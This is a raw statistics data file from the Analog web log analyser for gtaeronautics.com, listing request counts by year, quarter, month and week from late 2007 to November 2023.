x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2023	11	06	01	59
x	FR	2007	12	18	17	05
x	LR	2023	11	05	04	46
x	E7	2023	11	06	01	59
x	SR	1491607
x	S7	9669
x	NC	543354
x	C7	0
x	FL	548342
x	F7	577
x	RR	218
x	R7	0
x	NH	106142
x	H7	424
x	BT	57520368399
x	B7	0
1	Rr	398609	26.723	2023
1	Rr	82334	5.520	2022
1	Rr	98917	6.632	2021
1	Rr	89380	5.992	2020
1	Rr	80088	5.369	2019
1	Rr	68927	4.621	2018
1	Rr	60168	4.034	2017
1	Rr	73316	4.915	2016
1	Rr	80796	5.417	2015
1	Rr	110773	7.426	2014
1	Rr	65173	4.369	2013
1	Rr	60742	4.072	2012
1	Rr	57015	3.822	2011
1	Rr	22139	1.484	2010
1	Rr	69710	4.673	2009
1	Rr	71820	4.815	2008
1	Rr	1700	0.114	2007
1	*BT	R	398609	2023
Q	Rr	69669	4.671	2023	4
Q	Rr	165939	11.125	2023	3
Q	Rr	135306	9.071	2023	2
Q	Rr	27695	1.857	2023	1
Q	Rr	20307	1.361	2022	4
Q	Rr	20362	1.365	2022	3
Q	Rr	21795	1.461	2022	2
Q	Rr	19870	1.332	2022	1
Q	Rr	21154	1.418	2021	4
Q	Rr	26826	1.798	2021	3
Q	Rr	30675	2.057	2021	2
Q	Rr	20262	1.358	2021	1
Q	Rr	22199	1.488	2020	4
Q	Rr	23882	1.601	2020	3
Q	Rr	21656	1.452	2020	2
Q	Rr	21643	1.451	2020	1
Q	Rr	19098	1.280	2019	4
Q	Rr	19668	1.319	2019	3
Q	Rr	19827	1.329	2019	2
Q	Rr	21495	1.441	2019	1
Q	Rr	18129	1.215	2018	4
Q	Rr	17138	1.149	2018	3
Q	Rr	16928	1.135	2018	2
Q	Rr	16732	1.122	2018	1
Q	Rr	15937	1.068	2017	4
Q	Rr	0	0.000	2017	3
Q	Rr	16831	1.128	2017	2
Q	Rr	27400	1.837	2017	1
Q	Rr	22114	1.483	2016	4
Q	Rr	17621	1.181	2016	3
Q	Rr	15878	1.064	2016	2
Q	Rr	17703	1.187	2016	1
Q	Rr	16575	1.111	2015	4
Q	Rr	22104	1.482	2015	3
Q	Rr	22485	1.507	2015	2
Q	Rr	19632	1.316	2015	1
Q	Rr	21142	1.417	2014	4
Q	Rr	22272	1.493	2014	3
Q	Rr	31453	2.109	2014	2
Q	Rr	35906	2.407	2014	1
Q	Rr	16436	1.102	2013	4
Q	Rr	15216	1.020	2013	3
Q	Rr	16545	1.109	2013	2
Q	Rr	16976	1.138	2013	1
Q	Rr	16578	1.111	2012	4
Q	Rr	12511	0.839	2012	3
Q	Rr	15816	1.060	2012	2
Q	Rr	15837	1.062	2012	1
Q	Rr	15444	1.035	2011	4
Q	Rr	17386	1.166	2011	3
Q	Rr	9395	0.630	2011	2
Q	Rr	14790	0.992	2011	1
Q	Rr	1603	0.107	2010	4
Q	Rr	0	0.000	2010	3
Q	Rr	14047	0.942	2010	2
Q	Rr	6489	0.435	2010	1
Q	Rr	16350	1.096	2009	4
Q	Rr	18220	1.222	2009	3
Q	Rr	17115	1.147	2009	2
Q	Rr	18025	1.208	2009	1
Q	Rr	15905	1.066	2008	4
Q	Rr	15660	1.050	2008	3
Q	Rr	22448	1.505	2008	2
Q	Rr	17807	1.194	2008	1
Q	Rr	1700	0.114	2007	4
Q	*BT	R	165939	2023	3
m	Rr	3590	0.241	2023	11
m	Rr	66079	4.430	2023	10
m	Rr	51132	3.428	2023	09
m	Rr	54561	3.658	2023	08
m	Rr	60246	4.039	2023	07
m	Rr	66204	4.438	2023	06
m	Rr	60120	4.031	2023	05
m	Rr	8982	0.602	2023	04
m	Rr	10848	0.727	2023	03
m	Rr	8360	0.560	2023	02
m	Rr	8487	0.569	2023	01
m	Rr	6950	0.466	2022	12
m	Rr	6349	0.426	2022	11
m	Rr	7008	0.470	2022	10
m	Rr	6740	0.452	2022	09
m	Rr	6863	0.460	2022	08
m	Rr	6759	0.453	2022	07
m	Rr	6567	0.440	2022	06
m	Rr	8427	0.565	2022	05
m	Rr	6801	0.456	2022	04
m	Rr	6380	0.428	2022	03
m	Rr	6175	0.414	2022	02
m	Rr	7315	0.490	2022	01
m	Rr	7667	0.514	2021	12
m	Rr	7097	0.476	2021	11
m	Rr	6390	0.428	2021	10
m	Rr	6059	0.406	2021	09
m	Rr	9092	0.610	2021	08
m	Rr	11675	0.783	2021	07
m	Rr	10152	0.681	2021	06
m	Rr	10231	0.686	2021	05
m	Rr	10292	0.690	2021	04
m	Rr	7948	0.533	2021	03
m	Rr	5800	0.389	2021	02
m	Rr	6514	0.437	2021	01
m	Rr	8069	0.541	2020	12
m	Rr	6579	0.441	2020	11
m	Rr	7551	0.506	2020	10
m	Rr	8028	0.538	2020	09
m	Rr	7741	0.519	2020	08
m	Rr	8113	0.544	2020	07
m	Rr	7317	0.491	2020	06
m	Rr	6898	0.462	2020	05
m	Rr	7441	0.499	2020	04
m	Rr	7524	0.504	2020	03
m	Rr	7322	0.491	2020	02
m	Rr	6797	0.456	2020	01
m	Rr	6573	0.441	2019	12
m	Rr	5917	0.397	2019	11
m	Rr	6608	0.443	2019	10
m	Rr	6791	0.455	2019	09
m	Rr	6597	0.442	2019	08
m	Rr	6280	0.421	2019	07
m	Rr	6317	0.424	2019	06
m	Rr	6847	0.459	2019	05
m	Rr	6663	0.447	2019	04
m	Rr	7059	0.473	2019	03
m	Rr	6374	0.427	2019	02
m	Rr	8062	0.540	2019	01
m	Rr	6957	0.466	2018	12
m	Rr	5422	0.364	2018	11
m	Rr	5750	0.385	2018	10
m	Rr	5458	0.366	2018	09
m	Rr	5735	0.384	2018	08
m	Rr	5945	0.399	2018	07
m	Rr	7110	0.477	2018	06
m	Rr	6440	0.432	2018	05
m	Rr	3378	0.226	2018	04
m	Rr	5789	0.388	2018	03
m	Rr	5369	0.360	2018	02
m	Rr	5574	0.374	2018	01
m	Rr	3906	0.262	2017	12
m	Rr	6533	0.438	2017	11
m	Rr	5498	0.369	2017	10
m	Rr	0	0.000	2017	09
m	Rr	0	0.000	2017	08
m	Rr	0	0.000	2017	07
m	Rr	0	0.000	2017	06
m	Rr	6832	0.458	2017	05
m	Rr	9999	0.670	2017	04
m	Rr	11887	0.797	2017	03
m	Rr	7941	0.532	2017	02
m	Rr	7572	0.508	2017	01
m	Rr	9483	0.636	2016	12
m	Rr	7121	0.477	2016	11
m	Rr	5510	0.369	2016	10
m	Rr	6288	0.422	2016	09
m	Rr	5888	0.395	2016	08
m	Rr	5445	0.365	2016	07
m	Rr	5042	0.338	2016	06
m	Rr	5495	0.368	2016	05
m	Rr	5341	0.358	2016	04
m	Rr	5558	0.373	2016	03
m	Rr	5548	0.372	2016	02
m	Rr	6597	0.442	2016	01
m	Rr	5574	0.374	2015	12
m	Rr	5330	0.357	2015	11
m	Rr	5671	0.380	2015	10
m	Rr	6196	0.415	2015	09
m	Rr	6788	0.455	2015	08
m	Rr	9120	0.611	2015	07
m	Rr	7156	0.480	2015	06
m	Rr	5694	0.382	2015	05
m	Rr	9635	0.646	2015	04
m	Rr	6215	0.417	2015	03
m	Rr	6084	0.408	2015	02
m	Rr	7333	0.492	2015	01
m	Rr	6608	0.443	2014	12
m	Rr	6997	0.469	2014	11
m	Rr	7537	0.505	2014	10
m	Rr	7043	0.472	2014	09
m	Rr	7324	0.491	2014	08
m	Rr	7905	0.530	2014	07
m	Rr	11654	0.781	2014	06
m	Rr	9211	0.618	2014	05
m	Rr	10588	0.710	2014	04
m	Rr	7817	0.524	2014	03
m	Rr	15229	1.021	2014	02
m	Rr	12860	0.862	2014	01
m	Rr	5325	0.357	2013	12
m	Rr	5513	0.370	2013	11
m	Rr	5598	0.375	2013	10
m	Rr	4655	0.312	2013	09
m	Rr	4938	0.331	2013	08
m	Rr	5623	0.377	2013	07
m	Rr	5492	0.368	2013	06
m	Rr	5211	0.349	2013	05
m	Rr	5842	0.392	2013	04
m	Rr	6068	0.407	2013	03
m	Rr	5055	0.339	2013	02
m	Rr	5853	0.392	2013	01
m	Rr	5688	0.381	2012	12
m	Rr	5477	0.367	2012	11
m	Rr	5413	0.363	2012	10
m	Rr	4331	0.290	2012	09
m	Rr	3866	0.259	2012	08
m	Rr	4314	0.289	2012	07
m	Rr	4655	0.312	2012	06
m	Rr	6047	0.405	2012	05
m	Rr	5114	0.343	2012	04
m	Rr	6128	0.411	2012	03
m	Rr	5430	0.364	2012	02
m	Rr	4279	0.287	2012	01
m	Rr	5548	0.372	2011	12
m	Rr	4779	0.320	2011	11
m	Rr	5117	0.343	2011	10
m	Rr	5431	0.364	2011	09
m	Rr	6256	0.419	2011	08
m	Rr	5699	0.382	2011	07
m	Rr	5420	0.363	2011	06
m	Rr	3975	0.266	2011	05
m	Rr	0	0.000	2011	04
m	Rr	3608	0.242	2011	03
m	Rr	5171	0.347	2011	02
m	Rr	6011	0.403	2011	01
m	Rr	1603	0.107	2010	12
m	Rr	0	0.000	2010	11
m	Rr	0	0.000	2010	10
m	Rr	0	0.000	2010	09
m	Rr	0	0.000	2010	08
m	Rr	0	0.000	2010	07
m	Rr	4101	0.275	2010	06
m	Rr	5018	0.336	2010	05
m	Rr	4928	0.330	2010	04
m	Rr	5095	0.342	2010	03
m	Rr	1394	0.093	2010	02
m	Rr	0	0.000	2010	01
m	Rr	4665	0.313	2009	12
m	Rr	6187	0.415	2009	11
m	Rr	5498	0.369	2009	10
m	Rr	5066	0.340	2009	09
m	Rr	5718	0.383	2009	08
m	Rr	7436	0.499	2009	07
m	Rr	5685	0.381	2009	06
m	Rr	6120	0.410	2009	05
m	Rr	5310	0.356	2009	04
m	Rr	5515	0.370	2009	03
m	Rr	6123	0.410	2009	02
m	Rr	6387	0.428	2009	01
m	Rr	5763	0.386	2008	12
m	Rr	5420	0.363	2008	11
m	Rr	4722	0.317	2008	10
m	Rr	5435	0.364	2008	09
m	Rr	4843	0.325	2008	08
m	Rr	5382	0.361	2008	07
m	Rr	6082	0.408	2008	06
m	Rr	9946	0.667	2008	05
m	Rr	6420	0.430	2008	04
m	Rr	5431	0.364	2008	03
m	Rr	6469	0.434	2008	02
m	Rr	5907	0.396	2008	01
m	Rr	1700	0.114	2007	12
m	*BT	R	66204	2023	06
W	Rr	74	0.005	2023	11	05
W	Rr	11167	0.749	2023	10	29
W	Rr	13980	0.937	2023	10	22
W	Rr	15450	1.036	2023	10	15
W	Rr	14713	0.986	2023	10	08
W	Rr	14285	0.958	2023	10	01
W	Rr	14478	0.971	2023	09	24
W	Rr	11904	0.798	2023	09	17
W	Rr	10968	0.735	2023	09	10
W	Rr	10482	0.703	2023	09	03
W	Rr	10800	0.724	2023	08	27
W	Rr	14568	0.977	2023	08	20
W	Rr	12504	0.838	2023	08	13
W	Rr	12076	0.810	2023	08	06
W	Rr	10997	0.737	2023	07	30
W	Rr	13392	0.898	2023	07	23
W	Rr	13224	0.887	2023	07	16
W	Rr	16128	1.081	2023	07	09
W	Rr	13356	0.895	2023	07	02
W	Rr	12558	0.842	2023	06	25
W	Rr	17082	1.145	2023	06	18
W	Rr	16452	1.103	2023	06	11
W	Rr	15336	1.028	2023	06	04
W	Rr	13482	0.904	2023	05	28
W	Rr	16248	1.089	2023	05	21
W	Rr	15078	1.011	2023	05	14
W	Rr	17181	1.152	2023	05	07
W	Rr	4282	0.287	2023	04	30
W	Rr	2458	0.165	2023	04	23
W	Rr	2269	0.152	2023	04	16
W	Rr	1553	0.104	2023	04	09
W	Rr	2389	0.160	2023	04	02
W	Rr	1701	0.114	2023	03	26
W	Rr	1943	0.130	2023	03	19
W	Rr	2225	0.149	2023	03	12
W	Rr	2192	0.147	2023	03	05
W	Rr	4055	0.272	2023	02	26
W	Rr	2406	0.161	2023	02	19
W	Rr	1898	0.127	2023	02	12
W	Rr	1890	0.127	2023	02	05
W	Rr	1861	0.125	2023	01	29
W	Rr	1686	0.113	2023	01	22
W	Rr	1779	0.119	2023	01	15
W	Rr	1833	0.123	2023	01	08
W	Rr	2226	0.149	2023	01	01
W	Rr	1280	0.086	2022	12	25
W	Rr	1806	0.121	2022	12	18
W	Rr	1773	0.119	2022	12	11
W	Rr	1532	0.103	2022	12	04
W	Rr	1586	0.106	2022	11	27
W	Rr	1093	0.073	2022	11	20
W	Rr	1366	0.092	2022	11	13
W	Rr	1972	0.132	2022	11	06
W	Rr	1396	0.094	2022	10	30
W	Rr	1547	0.104	2022	10	23
W	Rr	1641	0.110	2022	10	16
W	Rr	1747	0.117	2022	10	09
W	Rr	1568	0.105	2022	10	02
W	Rr	1379	0.092	2022	09	25
W	Rr	1695	0.114	2022	09	18
W	Rr	1701	0.114	2022	09	11
W	Rr	1568	0.105	2022	09	04
W	Rr	1562	0.105	2022	08	28
W	Rr	1488	0.100	2022	08	21
W	Rr	1646	0.110	2022	08	14
W	Rr	1430	0.096	2022	08	07
W	Rr	1446	0.097	2022	07	31
W	Rr	1383	0.093	2022	07	24
W	Rr	1661	0.111	2022	07	17
W	Rr	1478	0.099	2022	07	10
W	Rr	1711	0.115	2022	07	03
W	Rr	1804	0.121	2022	06	26
W	Rr	1298	0.087	2022	06	19
W	Rr	1407	0.094	2022	06	12
W	Rr	1396	0.094	2022	06	05
W	Rr	1638	0.110	2022	05	29
W	Rr	1724	0.116	2022	05	22
W	Rr	2427	0.163	2022	05	15
W	Rr	2100	0.141	2022	05	08
W	Rr	1414	0.095	2022	05	01
W	Rr	1865	0.125	2022	04	24
W	Rr	1381	0.093	2022	04	17
W	Rr	1630	0.109	2022	04	10
W	Rr	1670	0.112	2022	04	03
W	Rr	1588	0.106	2022	03	27
W	Rr	1204	0.081	2022	03	20
W	Rr	1350	0.091	2022	03	13
W	Rr	1488	0.100	2022	03	06
W	Rr	1368	0.092	2022	02	27
W	Rr	1481	0.099	2022	02	20
W	Rr	1657	0.111	2022	02	13
W	Rr	1518	0.102	2022	02	06
W	Rr	1787	0.120	2022	01	30
W	Rr	2021	0.135	2022	01	23
W	Rr	1429	0.096	2022	01	16
W	Rr	1693	0.114	2022	01	09
W	Rr	1541	0.103	2022	01	02
W	Rr	1311	0.088	2021	12	26
W	Rr	1839	0.123	2021	12	19
W	Rr	1732	0.116	2021	12	12
W	Rr	2001	0.134	2021	12	05
W	Rr	1641	0.110	2021	11	28
W	Rr	1615	0.108	2021	11	21
W	Rr	1673	0.112	2021	11	14
W	Rr	1625	0.109	2021	11	07
W	Rr	1523	0.102	2021	10	31
W	Rr	1562	0.105	2021	10	24
W	Rr	1474	0.099	2021	10	17
W	Rr	1349	0.090	2021	10	10
W	Rr	1615	0.108	2021	10	03
W	Rr	1598	0.107	2021	09	26
W	Rr	1646	0.110	2021	09	19
W	Rr	1203	0.081	2021	09	12
W	Rr	1106	0.074	2021	09	05
W	Rr	1383	0.093	2021	08	29
W	Rr	1685	0.113	2021	08	22
W	Rr	2071	0.139	2021	08	15
W	Rr	2279	0.153	2021	08	08
W	Rr	2374	0.159	2021	08	01
W	Rr	2543	0.170	2021	07	25
W	Rr	2843	0.191	2021	07	18
W	Rr	2777	0.186	2021	07	11
W	Rr	2756	0.185	2021	07	04
W	Rr	2524	0.169	2021	06	27
W	Rr	2466	0.165	2021	06	20
W	Rr	2262	0.152	2021	06	13
W	Rr	2264	0.152	2021	06	06
W	Rr	2101	0.141	2021	05	30
W	Rr	3009	0.202	2021	05	23
W	Rr	1989	0.133	2021	05	16
W	Rr	2386	0.160	2021	05	09
W	Rr	2138	0.143	2021	05	02
W	Rr	1668	0.112	2021	04	25
W	Rr	2413	0.162	2021	04	18
W	Rr	3035	0.203	2021	04	11
W	Rr	2709	0.182	2021	04	04
W	Rr	1942	0.130	2021	03	28
W	Rr	1666	0.112	2021	03	21
W	Rr	1476	0.099	2021	03	14
W	Rr	1713	0.115	2021	03	07
W	Rr	1777	0.119	2021	02	28
W	Rr	1173	0.079	2021	02	21
W	Rr	1101	0.074	2021	02	14
W	Rr	1699	0.114	2021	02	07
W	Rr	1867	0.125	2021	01	31
W	Rr	1404	0.094	2021	01	24
W	Rr	1564	0.105	2021	01	17
W	Rr	1431	0.096	2021	01	10
W	Rr	1666	0.112	2021	01	03
W	Rr	1926	0.129	2020	12	27
W	Rr	1572	0.105	2020	12	20
W	Rr	1404	0.094	2020	12	13
W	Rr	2272	0.152	2020	12	06
W	Rr	1522	0.102	2020	11	29
W	Rr	1722	0.115	2020	11	22
W	Rr	1580	0.106	2020	11	15
W	Rr	1401	0.094	2020	11	08
W	Rr	1499	0.100	2020	11	01
W	Rr	1470	0.099	2020	10	25
W	Rr	2379	0.159	2020	10	18
W	Rr	1559	0.105	2020	10	11
W	Rr	1729	0.116	2020	10	04
W	Rr	1674	0.112	2020	09	27
W	Rr	1786	0.120	2020	09	20
W	Rr	2200	0.147	2020	09	13
W	Rr	1677	0.112	2020	09	06
W	Rr	1596	0.107	2020	08	30
W	Rr	1833	0.123	2020	08	23
W	Rr	1814	0.122	2020	08	16
W	Rr	2206	0.148	2020	08	09
W	Rr	1397	0.094	2020	08	02
W	Rr	1816	0.122	2020	07	26
W	Rr	1949	0.131	2020	07	19
W	Rr	1532	0.103	2020	07	12
W	Rr	1976	0.132	2020	07	05
W	Rr	1600	0.107	2020	06	28
W	Rr	1627	0.109	2020	06	21
W	Rr	2101	0.141	2020	06	14
W	Rr	1590	0.107	2020	06	07
W	Rr	1492	0.100	2020	05	31
W	Rr	1556	0.104	2020	05	24
W	Rr	1756	0.118	2020	05	17
W	Rr	1568	0.105	2020	05	10
W	Rr	1567	0.105	2020	05	03
W	Rr	1734	0.116	2020	04	26
W	Rr	1675	0.112	2020	04	19
W	Rr	1702	0.114	2020	04	12
W	Rr	1965	0.132	2020	04	05
W	Rr	1329	0.089	2020	03	29
W	Rr	1818	0.122	2020	03	22
W	Rr	1345	0.090	2020	03	15
W	Rr	1581	0.106	2020	03	08
W	Rr	2014	0.135	2020	03	01
W	Rr	1942	0.130	2020	02	23
W	Rr	1748	0.117	2020	02	16
W	Rr	1949	0.131	2020	02	09
W	Rr	1683	0.113	2020	02	02
W	Rr	1436	0.096	2020	01	26
W	Rr	1792	0.120	2020	01	19
W	Rr	1519	0.102	2020	01	12
W	Rr	1420	0.095	2020	01	05
W	Rr	1109	0.074	2019	12	29
W	Rr	1023	0.069	2019	12	22
W	Rr	1584	0.106	2019	12	15
W	Rr	1783	0.120	2019	12	08
W	Rr	1704	0.114	2019	12	01
W	Rr	1178	0.079	2019	11	24
W	Rr	1697	0.114	2019	11	17
W	Rr	1510	0.101	2019	11	10
W	Rr	1383	0.093	2019	11	03
W	Rr	1309	0.088	2019	10	27
W	Rr	1473	0.099	2019	10	20
W	Rr	1519	0.102	2019	10	13
W	Rr	1485	0.100	2019	10	06
W	Rr	1416	0.095	2019	09	29
W	Rr	1499	0.100	2019	09	22
W	Rr	1652	0.111	2019	09	15
W	Rr	1710	0.115	2019	09	08
W	Rr	1485	0.100	2019	09	01
W	Rr	1689	0.113	2019	08	25
W	Rr	1315	0.088	2019	08	18
W	Rr	1619	0.109	2019	08	11
W	Rr	1558	0.104	2019	08	04
W	Rr	1360	0.091	2019	07	28
W	Rr	1191	0.080	2019	07	21
W	Rr	1730	0.116	2019	07	14
W	Rr	1299	0.087	2019	07	07
W	Rr	1339	0.090	2019	06	30
W	Rr	1592	0.107	2019	06	23
W	Rr	1497	0.100	2019	06	16
W	Rr	1450	0.097	2019	06	09
W	Rr	1555	0.104	2019	06	02
W	Rr	1289	0.086	2019	05	26
W	Rr	1863	0.125	2019	05	19
W	Rr	1385	0.093	2019	05	12
W	Rr	1553	0.104	2019	05	05
W	Rr	1655	0.111	2019	04	28
W	Rr	1282	0.086	2019	04	21
W	Rr	1503	0.101	2019	04	14
W	Rr	1623	0.109	2019	04	07
W	Rr	1715	0.115	2019	03	31
W	Rr	1882	0.126	2019	03	24
W	Rr	1464	0.098	2019	03	17
W	Rr	1381	0.093	2019	03	10
W	Rr	1627	0.109	2019	03	03
W	Rr	1773	0.119	2019	02	24
W	Rr	1669	0.112	2019	02	17
W	Rr	1483	0.099	2019	02	10
W	Rr	1391	0.093	2019	02	03
W	Rr	1797	0.120	2019	01	27
W	Rr	1963	0.132	2019	01	20
W	Rr	2029	0.136	2019	01	13
W	Rr	1696	0.114	2019	01	06
W	Rr	1526	0.102	2018	12	30
W	Rr	1226	0.082	2018	12	23
W	Rr	1442	0.097	2018	12	16
W	Rr	1936	0.130	2018	12	09
W	Rr	1809	0.121	2018	12	02
W	Rr	1295	0.087	2018	11	25
W	Rr	1820	0.122	2018	11	18
W	Rr	1802	0.121	2018	11	11
W	Rr	0	0.000	2018	11	04
W	Rr	1473	0.099	2018	10	28
W	Rr	1106	0.074	2018	10	21
W	Rr	1427	0.096	2018	10	14
W	Rr	1214	0.081	2018	10	07
W	Rr	1168	0.078	2018	09	30
W	Rr	1420	0.095	2018	09	23
W	Rr	1197	0.080	2018	09	16
W	Rr	1388	0.093	2018	09	09
W	Rr	1320	0.088	2018	09	02
W	Rr	1246	0.084	2018	08	26
W	Rr	1214	0.081	2018	08	19
W	Rr	1366	0.092	2018	08	12
W	Rr	1195	0.080	2018	08	05
W	Rr	1346	0.090	2018	07	29
W	Rr	1374	0.092	2018	07	22
W	Rr	1508	0.101	2018	07	15
W	Rr	1522	0.102	2018	07	08
W	Rr	909	0.061	2018	07	01
W	Rr	1444	0.097	2018	06	24
W	Rr	2682	0.180	2018	06	17
W	Rr	1365	0.092	2018	06	10
W	Rr	1329	0.089	2018	06	03
W	Rr	1275	0.085	2018	05	27
W	Rr	1392	0.093	2018	05	20
W	Rr	1321	0.089	2018	05	13
W	Rr	1527	0.102	2018	05	06
W	Rr	1517	0.102	2018	04	29
W	Rr	0	0.000	2018	04	22
W	Rr	1364	0.091	2018	04	15
W	Rr	1712	0.115	2018	04	08
W	Rr	0	0.000	2018	04	01
W	Rr	1543	0.103	2018	03	25
W	Rr	1342	0.090	2018	03	18
W	Rr	2429	0.163	2018	03	11
W	Rr	0	0.000	2018	03	04
W	Rr	1366	0.092	2018	02	25
W	Rr	1308	0.088	2018	02	18
W	Rr	1439	0.096	2018	02	11
W	Rr	1731	0.116	2018	02	04
W	Rr	0	0.000	2018	01	28
W	Rr	1434	0.096	2018	01	21
W	Rr	1578	0.106	2018	01	14
W	Rr	1471	0.099	2018	01	07
W	Rr	1246	0.084	2017	12	31
W	Rr	1033	0.069	2017	12	24
W	Rr	1103	0.074	2017	12	17
W	Rr	1406	0.094	2017	12	10
W	Rr	0	0.000	2017	12	03
W	Rr	1335	0.090	2017	11	26
W	Rr	1427	0.096	2017	11	19
W	Rr	1662	0.111	2017	11	12
W	Rr	1414	0.095	2017	11	05
W	Rr	1349	0.090	2017	10	29
W	Rr	1208	0.081	2017	10	22
W	Rr	2013	0.135	2017	10	15
W	Rr	1832	0.123	2017	10	08
W	Rr	0	0.000	2017	10	01
W	Rr	0	0.000	2017	09	24
W	Rr	0	0.000	2017	09	17
W	Rr	0	0.000	2017	09	10
W	Rr	0	0.000	2017	09	03
W	Rr	0	0.000	2017	08	27
W	Rr	0	0.000	2017	08	20
W	Rr	0	0.000	2017	08	13
W	Rr	0	0.000	2017	08	06
W	Rr	0	0.000	2017	07	30
W	Rr	0	0.000	2017	07	23
W	Rr	0	0.000	2017	07	16
W	Rr	0	0.000	2017	07	09
W	Rr	0	0.000	2017	07	02
W	Rr	0	0.000	2017	06	25
W	Rr	0	0.000	2017	06	18
W	Rr	0	0.000	2017	06	11
W	Rr	0	0.000	2017	06	04
W	Rr	25	0.002	2017	05	28
W	Rr	1838	0.123	2017	05	21
W	Rr	1915	0.128	2017	05	14
W	Rr	1676	0.112	2017	05	07
W	Rr	1677	0.112	2017	04	30
W	Rr	2071	0.139	2017	04	23
W	Rr	1978	0.133	2017	04	16
W	Rr	1874	0.126	2017	04	09
W	Rr	3435	0.230	2017	04	02
W	Rr	2619	0.176	2017	03	26
W	Rr	2633	0.177	2017	03	19
W	Rr	2413	0.162	2017	03	12
W	Rr	3092	0.207	2017	03	05
W	Rr	2295	0.154	2017	02	26
W	Rr	2204	0.148	2017	02	19
W	Rr	1869	0.125	2017	02	12
W	Rr	1973	0.132	2017	02	05
W	Rr	1783	0.120	2017	01	29
W	Rr	1768	0.119	2017	01	22
W	Rr	1585	0.106	2017	01	15
W	Rr	1768	0.119	2017	01	08
W	Rr	1740	0.117	2017	01	01
W	Rr	1549	0.104	2016	12	25
W	Rr	2202	0.148	2016	12	18
W	Rr	1812	0.121	2016	12	11
W	Rr	2648	0.178	2016	12	04
W	Rr	2236	0.150	2016	11	27
W	Rr	1321	0.089	2016	11	20
W	Rr	1996	0.134	2016	11	13
W	Rr	1716	0.115	2016	11	06
W	Rr	1564	0.105	2016	10	30
W	Rr	1362	0.091	2016	10	23
W	Rr	1707	0.114	2016	10	16
W	Rr	1696	0.114	2016	10	09
W	Rr	36	0.002	2016	10	02
W	Rr	2002	0.134	2016	09	25
W	Rr	1399	0.094	2016	09	18
W	Rr	1199	0.080	2016	09	11
W	Rr	1326	0.089	2016	09	04
W	Rr	1316	0.088	2016	08	28
W	Rr	1257	0.084	2016	08	21
W	Rr	1208	0.081	2016	08	14
W	Rr	1602	0.107	2016	08	07
W	Rr	1319	0.088	2016	07	31
W	Rr	1796	0.120	2016	07	24
W	Rr	1171	0.079	2016	07	17
W	Rr	1167	0.078	2016	07	10
W	Rr	917	0.061	2016	07	03
W	Rr	920	0.062	2016	06	26
W	Rr	1179	0.079	2016	06	19
W	Rr	1288	0.086	2016	06	12
W	Rr	1237	0.083	2016	06	05
W	Rr	1263	0.085	2016	05	29
W	Rr	1338	0.090	2016	05	22
W	Rr	1184	0.079	2016	05	15
W	Rr	1365	0.092	2016	05	08
W	Rr	974	0.065	2016	05	01
W	Rr	1311	0.088	2016	04	24
W	Rr	1127	0.076	2016	04	17
W	Rr	1248	0.084	2016	04	10
W	Rr	1451	0.097	2016	04	03
W	Rr	987	0.066	2016	03	27
W	Rr	1233	0.083	2016	03	20
W	Rr	1347	0.090	2016	03	13
W	Rr	1347	0.090	2016	03	06
W	Rr	1236	0.083	2016	02	28
W	Rr	1422	0.095	2016	02	21
W	Rr	1085	0.073	2016	02	14
W	Rr	1427	0.096	2016	02	07
W	Rr	1359	0.091	2016	01	31
W	Rr	1708	0.115	2016	01	24
W	Rr	1476	0.099	2016	01	17
W	Rr	1563	0.105	2016	01	10
W	Rr	1381	0.093	2016	01	03
W	Rr	1273	0.085	2015	12	27
W	Rr	1084	0.073	2015	12	20
W	Rr	1344	0.090	2015	12	13
W	Rr	1336	0.090	2015	12	06
W	Rr	1123	0.075	2015	11	29
W	Rr	960	0.064	2015	11	22
W	Rr	1337	0.090	2015	11	15
W	Rr	1400	0.094	2015	11	08
W	Rr	1383	0.093	2015	11	01
W	Rr	1250	0.084	2015	10	25
W	Rr	1366	0.092	2015	10	18
W	Rr	1367	0.092	2015	10	11
W	Rr	1214	0.081	2015	10	04
W	Rr	1152	0.077	2015	09	27
W	Rr	1387	0.093	2015	09	20
W	Rr	1655	0.111	2015	09	13
W	Rr	1526	0.102	2015	09	06
W	Rr	1242	0.083	2015	08	30
W	Rr	1800	0.121	2015	08	23
W	Rr	1527	0.102	2015	08	16
W	Rr	1386	0.093	2015	08	09
W	Rr	1593	0.107	2015	08	02
W	Rr	1567	0.105	2015	07	26
W	Rr	1980	0.133	2015	07	19
W	Rr	2180	0.146	2015	07	12
W	Rr	2008	0.135	2015	07	05
W	Rr	2297	0.154	2015	06	28
W	Rr	1556	0.104	2015	06	21
W	Rr	1380	0.093	2015	06	14
W	Rr	2013	0.135	2015	06	07
W	Rr	1651	0.111	2015	05	31
W	Rr	1224	0.082	2015	05	24
W	Rr	1355	0.091	2015	05	17
W	Rr	1179	0.079	2015	05	10
W	Rr	1436	0.096	2015	05	03
W	Rr	1671	0.112	2015	04	26
W	Rr	1878	0.126	2015	04	19
W	Rr	2326	0.156	2015	04	12
W	Rr	2636	0.177	2015	04	05
W	Rr	2297	0.154	2015	03	29
W	Rr	1237	0.083	2015	03	22
W	Rr	1453	0.097	2015	03	15
W	Rr	1399	0.094	2015	03	08
W	Rr	1287	0.086	2015	03	01
W	Rr	1249	0.084	2015	02	22
W	Rr	1373	0.092	2015	02	15
W	Rr	1790	0.120	2015	02	08
W	Rr	1672	0.112	2015	02	01
W	Rr	1543	0.103	2015	01	25
W	Rr	1463	0.098	2015	01	18
W	Rr	1696	0.114	2015	01	11
W	Rr	1707	0.114	2015	01	04
W	Rr	1833	0.123	2014	12	28
W	Rr	1335	0.090	2014	12	21
W	Rr	1644	0.110	2014	12	14
W	Rr	1541	0.103	2014	12	07
W	Rr	1335	0.090	2014	11	30
W	Rr	1262	0.085	2014	11	23
W	Rr	2009	0.135	2014	11	16
W	Rr	1566	0.105	2014	11	09
W	Rr	1814	0.122	2014	11	02
W	Rr	1452	0.097	2014	10	26
W	Rr	1642	0.110	2014	10	19
W	Rr	1795	0.120	2014	10	12
W	Rr	1836	0.123	2014	10	05
W	Rr	1662	0.111	2014	09	28
W	Rr	1843	0.124	2014	09	21
W	Rr	1678	0.112	2014	09	14
W	Rr	1598	0.107	2014	09	07
W	Rr	1418	0.095	2014	08	31
W	Rr	1584	0.106	2014	08	24
W	Rr	1571	0.105	2014	08	17
W	Rr	1727	0.116	2014	08	10
W	Rr	1927	0.129	2014	08	03
W	Rr	1691	0.113	2014	07	27
W	Rr	1702	0.114	2014	07	20
W	Rr	1624	0.109	2014	07	13
W	Rr	1831	0.123	2014	07	06
W	Rr	1867	0.125	2014	06	29
W	Rr	1927	0.129	2014	06	22
W	Rr	2134	0.143	2014	06	15
W	Rr	4851	0.325	2014	06	08
